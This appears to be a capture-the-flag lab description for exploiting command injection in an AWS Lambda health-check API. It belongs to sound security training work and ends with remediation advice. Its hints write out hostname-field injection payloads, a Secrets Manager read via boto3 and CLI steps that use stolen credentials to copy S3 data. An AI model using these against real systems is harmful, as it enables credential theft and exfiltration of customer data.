# Lambda Code Injection

**Difficulty:** medium  
**Description:** Exploit command injection in Lambda to steal credentials and exfiltrate S3 data  
**Estimated Time:** 60-90 minutes

## Overview

Serverless health check API built with API Gateway and Lambda. Python function performs ping operations against user-supplied hostnames. Exposed publicly for testing purposes.

The function has access to AWS Secrets Manager and S3 buckets containing sensitive customer data.

## Learning Objectives

- Identify and exploit command injection vulnerabilities in serverless functions
- Extract AWS credentials from Lambda execution environments
- Enumerate and access AWS Secrets Manager
- Leverage stolen credentials for lateral movement
- Exfiltrate data from protected S3 buckets
- Understand Lambda security model and IAM role permissions

## Scenario

Internal services use a health check API to verify connectivity to external systems. The API accepts JSON payloads with a hostname parameter and returns ping results.

Your goal is to exploit command injection in the Lambda function, extract temporary credentials, access Secrets Manager to find database credentials, and exfiltrate customer data from S3.

## Architecture

- API Gateway endpoint at `/healthcheck`
- Lambda function with Python 3.13 runtime
- IAM execution role with Secrets Manager and S3 permissions
- S3 bucket containing confidential customer database
- Secrets Manager storing database credentials and S3 paths

## Attack Surface

**API Endpoint:**
```bash
POST /healthcheck
Content-Type: application/json

{"hostname": "example.com"}
```

**Available from outputs:**
- API Gateway endpoint URL
- Lambda function name
- IAM execution role ARN

## Key Concepts

### Command Injection in Python

Function uses `subprocess.run()` with `shell=True`, enabling shell metacharacter exploitation:
- `;` - Command separator
- `&&` - Conditional execution (success)
- `||` - Conditional execution (failure)
- `|` - Pipe output

### Lambda Execution Environment

Lambda functions run with:
- Temporary IAM credentials (automatic via execution role)
- Environment variables containing config and secrets
- AWS SDK (boto3) pre-installed
- Execution timeout (3-10 seconds typical)
- Limited output size via API Gateway

### Lambda Credential Access

Credentials available through:
- Environment variables: `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`
- Automatic via boto3 SDK
- No IMDS endpoint (unlike EC2)

### Secrets Manager Structure

Secrets stored as JSON with:
- Secret name (identifier)
- Secret value (JSON string containing credentials/config)
- Metadata (ARN, description, rotation settings)

## Hints

<details>
<summary>Hint 1: Testing for Injection</summary>

Test shell operators appended to hostname:
```json
{"hostname": "example.com; whoami"}
{"hostname": "example.com && env"}
{"hostname": "example.com | cat /proc/self/environ"}
```
</details>

<details>
<summary>Hint 2: Credential Extraction</summary>

Lambda environment variables contain:
- `AWS_ACCESS_KEY_ID`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_SESSION_TOKEN`
- Custom variables (check for `SECRET_NAME`, `DB_SECRET`, etc.)

Use `env` or `printenv` to enumerate all variables.
</details>

<details>
<summary>Hint 3: Accessing Secrets Manager</summary>

Lambda includes boto3 by default. Execute Python inline:
```bash
; python3 -c "import boto3; print(boto3.client('secretsmanager').get_secret_value(SecretId='SECRET_NAME'))"
```

Or check if AWS CLI is available in the Lambda layer.
</details>

<details>
<summary>Hint 4: Exfiltration</summary>

Use extracted credentials locally:
```bash
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>

aws s3 ls
aws s3 cp s3://bucket/path/file.csv .
```
</details>

## Success Criteria

✓ Identify command injection vulnerability  
✓ Extract Lambda execution role credentials  
✓ Enumerate environment variables for secret names  
✓ Retrieve database credentials from Secrets Manager  
✓ Locate S3 bucket containing customer data  
✓ Download and read confidential customer database  
✓ Capture the flag from customer records

## Common Pitfalls

- Lambda execution timeout - keep commands efficient
- API Gateway response size limits - avoid large outputs
- JSON special character encoding
- Session token required for temporary credentials
- Secrets Manager may require specific region configuration

## Remediation

**Command Injection Prevention:**
- Never use `shell=True` with user input
- Use parameterized commands: `subprocess.run(['ping', '-c', '1', hostname])`
- Validate inputs with allowlists
- Sanitize all user-supplied data

**IAM Least Privilege:**
- Lambda health checks don't need Secrets Manager access
- Restrict S3 permissions to specific prefixes
- Use resource-based policies with conditions
- Implement permission boundaries

**Secrets Management:**
- Don't expose secret names in environment variables
- Use Parameter Store for non-sensitive config
- Implement automatic secret rotation
- Encrypt environment variables

**API Security:**
- Implement authentication (API keys, IAM, Cognito)
- Deploy WAF with injection pattern rules
- Enable rate limiting
- Configure CloudTrail logging for audit trails